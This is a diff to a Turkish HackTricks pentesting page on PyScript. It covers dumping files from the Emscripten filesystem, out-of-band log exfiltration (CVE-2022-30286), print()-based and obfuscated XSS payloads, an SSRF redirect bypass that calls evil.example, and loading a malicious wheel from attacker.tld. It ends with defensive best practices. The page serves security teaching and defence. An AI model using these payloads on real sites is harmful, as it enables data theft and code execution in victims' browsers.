@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## PyScript Pentesting Kılavuzu
+## PyScript Pentesting Rehberi
 
-PyScript, Python'u HTML ile entegre etmek için geliştirilmiş yeni bir çerçevedir, böylece HTML ile birlikte kullanılabilir. Bu kılavuzda, PyScript'i penetrasyon testleriniz için nasıl kullanacağınızı bulacaksınız.
+PyScript, Python'ı HTML ile entegre etmek için geliştirilmiş yeni bir çerçevedir, bu nedenle HTML ile birlikte kullanılabilir. Bu kılavuzda, PyScript'i penetrasyon testleriniz için nasıl kullanacağınızı bulacaksınız.
 
 ### Emscripten sanal bellek dosya sisteminden dosyaları dökme / alma:
 
@@ -19,7 +19,7 @@ with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
 ```
 ![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)
 
-### [Emscripten sanal bellek dosya sisteminin OOB Veri Sızdırma (konsol izleme)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
+### [Emscripten sanal bellek dosya sisteminin OOB Veri Sızdırılması (konsol izleme)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)
 
 `CVE ID: CVE-2022-30286`\
 \
@@ -47,7 +47,7 @@ body: JSON.stringify({ content: btoa(console.logs) }),
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)
 
-### Cross Site Scripting (Sıradan) 
+### Cross Site Scripting (Sıradan)
 
 Kod:
 ```python
@@ -78,7 +78,7 @@ print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
 Kod:
 ```html
 <py-script>
-prinht("
+prinht(""
 <script>
 var _0x3675bf = _0x5cf5
 function _0x5cf5(_0xced4e9, _0x1ae724) {
@@ -140,7 +140,7 @@ return _0x34a15f
 return _0x599c()
 }
 </script>
-")
+"")
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)
@@ -155,5 +155,63 @@ print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&
 </py-script>
 ```
 ![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)
+
+---
+
+## Yeni zafiyetler & teknikler (2023-2025)
+
+### Kontrolsüz yönlendirmeler aracılığıyla Sunucu Tarafı İstek Sahteciliği (CVE-2025-50182)
+
+`urllib3 < 2.5.0` `redirect` ve `retries` parametrelerini **PyScript ile birlikte gelen Pyodide çalışma zamanında** çalıştırıldığında göz ardı eder. Bir saldırgan hedef URL'leri etkileyebiliyorsa, geliştiricinin açıkça devre dışı bıraktığı durumlarda bile Python kodunun çapraz alan yönlendirmelerini takip etmesini zorlayabilir ‑ bu da anti-SSRF mantığını etkili bir şekilde atlatır.
+```html
+<script type="py">
+import urllib3
+http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
+r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
+print(r.status, r.url)
+</script>
+```
+`urllib3 2.5.0`'da yamanlandı – PyScript görüntünüzde paketi güncelleyin veya `packages = ["urllib3>=2.5.0"]` ile güvenli bir sürümü sabitleyin. Ayrıntılar için resmi CVE kaydına bakın.
+
+### Keyfi paket yükleme ve tedarik zinciri saldırıları
+
+PyScript, `packages` listesinde keyfi URL'lere izin verdiğinden, yapılandırmayı değiştirebilen veya enjekte edebilen kötü niyetli bir aktör, kurbanın tarayıcısında **tamamen keyfi Python** çalıştırabilir:
+```html
+<py-config>
+packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
+</py-config>
+<script type="py">
+import payload  # executes attacker-controlled code during installation
+</script>
+```
+*Sadece saf-Python tekerlekleri gereklidir – WebAssembly derleme adımına ihtiyaç yoktur.* Yapılandırmanın kullanıcı tarafından kontrol edilmediğinden emin olun ve güvenilir tekerlekleri kendi alanınızda HTTPS ve SRI hash'leri ile barındırın.
+
+### Çıktı sanitizasyon değişiklikleri (2023+)
+
+* `print()` hala ham HTML enjekte eder ve bu nedenle XSS'e açıktır (yukarıdaki örnekler).
+* Daha yeni `display()` yardımcı programı **varsayılan olarak HTML'yi kaçırır** – ham işaretleme `pyscript.HTML()` içinde sarılmalıdır.
+```python
+from pyscript import display, HTML
+
+display("<b>escaped</b>")          # renders literally
+
+display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
+```
+Bu davranış 2023'te tanıtıldı ve resmi Built-ins kılavuzunda belgelenmiştir. Güvenilmeyen girdi için `display()`'e güvenin ve `print()`'i doğrudan çağırmaktan kaçının.
+
+---
+
+## Savunma En İyi Uygulamaları
+
+* **Paketleri güncel tutun** – `urllib3 >= 2.5.0` sürümüne yükseltin ve siteyle birlikte gönderilen tekerlekleri düzenli olarak yeniden oluşturun.
+* **Paket kaynaklarını kısıtlayın** – yalnızca PyPI adlarını veya aynı kökenli URL'leri referans gösterin, tercihen Alt Kaynak Bütünlüğü (SRI) ile korunmuş.
+* **İçerik Güvenlik Politikasını Güçlendirin** – enjekte edilmiş `<script>` bloklarının çalıştırılamaması için satır içi JavaScript'i (`script-src 'self' 'sha256-…'`) yasaklayın.
+* **Kullanıcı tarafından sağlanan `<py-script>` / `<script type="py">` etiketlerini yasaklayın** – HTML'i diğer kullanıcılara geri yansıtmadan önce sunucuda temizleyin.
+* **Çalışanları İzole Edin** – çalışanlardan DOM'a senkron erişime ihtiyacınız yoksa, `SharedArrayBuffer` başlık gereksinimlerinden kaçınmak için `sync_main_only` bayrağını etkinleştirin.
+
+## Referanslar
+
+* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
+* [PyScript Built-ins belgeleri – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
 
 {{#include ../../banners/hacktricks-training.md}}
